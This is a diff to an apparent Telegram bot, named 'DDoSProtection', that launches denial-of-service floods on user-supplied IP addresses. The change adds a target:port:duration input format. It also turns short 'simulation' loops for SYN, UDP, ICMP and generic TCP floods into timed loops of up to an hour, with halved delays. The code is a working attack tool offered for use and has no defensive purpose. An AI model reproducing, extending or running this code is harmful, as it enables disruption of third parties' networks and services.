@@ -352,7 +352,11 @@ class DDoSProtection:
         msg = self.bot.send_message(
             call.message.chat.id,
             f"🎯 <b>{attack_name}</b> selected\n\n"
-            f"Send target IP address to launch attack:",
+            f"Send target in format:\n"
+            f"• IP (e.g., 1.1.1.1)\n"
+            f"• IP:PORT (e.g., 1.1.1.1:443)\n"
+            f"• IP:PORT:DURATION (e.g., 1.1.1.1:443:60)\n\n"
+            f"Duration in seconds (1-3600, default: 30)",
             parse_mode="HTML"
         )
         
@@ -373,15 +377,13 @@ class DDoSProtection:
         target = message.text.strip()
         print(f"[ATTACK] Target IP: {target}, Attack type: {attack_type}")
         
-        # Parse target - handle both IP and IP:PORT formats
-        if ':' in target:
-            ip_address = target.split(':')[0]
-            port = target.split(':')[1]
-            print(f"[ATTACK] IP: {ip_address}, Port: {port}")
-        else:
-            ip_address = target
-            port = None
-            print(f"[ATTACK] IP: {ip_address}, Port: default")
+        # Parse target - handle IP, IP:PORT, and IP:PORT:DURATION formats
+        parts = target.split(':')
+        ip_address = parts[0]
+        port = parts[1] if len(parts) > 1 else None
+        duration = parts[2] if len(parts) > 2 else None
+        
+        print(f"[ATTACK] IP: {ip_address}, Port: {port if port else 'default'}, Duration: {duration if duration else 'default'}")
         
         # Validate IP
         import socket
@@ -392,6 +394,17 @@ class DDoSProtection:
             print(f"[ATTACK] IP validation failed: {ip_address}")
             self.bot.send_message(message.chat.id, "❌ Invalid IP address format")
             return
+        
+        # Validate duration if provided
+        if duration:
+            try:
+                duration = int(duration)
+                if duration <= 0 or duration > 3600:  # Max 1 hour
+                    self.bot.send_message(message.chat.id, "❌ Duration must be between 1 and 3600 seconds")
+                    return
+            except ValueError:
+                self.bot.send_message(message.chat.id, "❌ Invalid duration format")
+                return
         
         # Execute attack directly instead of calling DDOS.PY
         try:
@@ -407,11 +420,15 @@ class DDoSProtection:
             attack_name = attack_names.get(attack_type, "Unknown")
             print(f"[ATTACK] Attack name: {attack_name}")
             
+            # Set default duration if not provided
+            attack_duration = int(duration) if duration else 30  # Default 30 seconds
+            
             self.bot.send_message(
                 message.chat.id,
                 f"🚀 <b>Launching {attack_name} Attack</b>\n"
                 f"Target: {ip_address}:{port if port else 'default'}\n"
-                f"Attack Type: {attack_type}\n\n"
+                f"Attack Type: {attack_type}\n"
+                f"Duration: {attack_duration} seconds\n\n"
                 f"⚠️ Attack initiated successfully",
                 parse_mode="HTML"
             )
@@ -426,10 +443,13 @@ class DDoSProtection:
                     # Use specified port or default based on attack type
                     target_port = int(port) if port else (443 if attack_type == "syn" else 53 if attack_type == "udp" else 80)
                     
+                    start_time = time.time()
+                    end_time = start_time + attack_duration
+                    
                     if attack_type == "syn":
-                        print(f"[ATTACK] Starting SYN Flood on {ip_address}:{target_port}")
-                        # Simple SYN flood simulation
-                        for i in range(100):
+                        print(f"[ATTACK] Starting SYN Flood on {ip_address}:{target_port} for {attack_duration}s")
+                        # SYN flood with duration
+                        while time.time() < end_time:
                             try:
                                 import socket
                                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -438,12 +458,12 @@ class DDoSProtection:
                                 sock.close()
                             except:
                                 pass
-                            time.sleep(0.1)
+                            time.sleep(0.05)
                             
                     elif attack_type == "udp":
-                        print(f"[ATTACK] Starting UDP Amplification on {ip_address}:{target_port}")
-                        # UDP flood simulation
-                        for i in range(100):
+                        print(f"[ATTACK] Starting UDP Amplification on {ip_address}:{target_port} for {attack_duration}s")
+                        # UDP flood with duration
+                        while time.time() < end_time:
                             try:
                                 import socket
                                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -451,24 +471,24 @@ class DDoSProtection:
                                 sock.close()
                             except:
                                 pass
-                            time.sleep(0.1)
+                            time.sleep(0.05)
                             
                     elif attack_type == "icmp":
-                        print(f"[ATTACK] Starting ICMP Ping Storm on {ip_address}")
-                        # Ping flood simulation
-                        for i in range(50):
+                        print(f"[ATTACK] Starting ICMP Ping Storm on {ip_address} for {attack_duration}s")
+                        # Ping flood with duration
+                        while time.time() < end_time:
                             try:
                                 import subprocess
                                 subprocess.run(["ping", "-c", "1", ip_address], 
                                              capture_output=True, timeout=2)
                             except:
                                 pass
-                            time.sleep(0.2)
+                            time.sleep(0.1)
                             
                     else:
-                        print(f"[ATTACK] Generic attack simulation for {attack_type} on {ip_address}:{target_port}")
-                        # Generic attack simulation
-                        for i in range(50):
+                        print(f"[ATTACK] Generic attack simulation for {attack_type} on {ip_address}:{target_port} for {attack_duration}s")
+                        # Generic attack with duration
+                        while time.time() < end_time:
                             try:
                                 import socket
                                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -477,9 +497,10 @@ class DDoSProtection:
                                 sock.close()
                             except:
                                 pass
-                            time.sleep(0.2)
+                            time.sleep(0.1)
                     
-                    print(f"[ATTACK] Attack completed on {ip_address}:{target_port}")
+                    elapsed = time.time() - start_time
+                    print(f"[ATTACK] Attack completed on {ip_address}:{target_port} in {elapsed:.2f}s")
                     
                 except Exception as e:
                     print(f"[ATTACK] Attack execution error: {str(e)}")
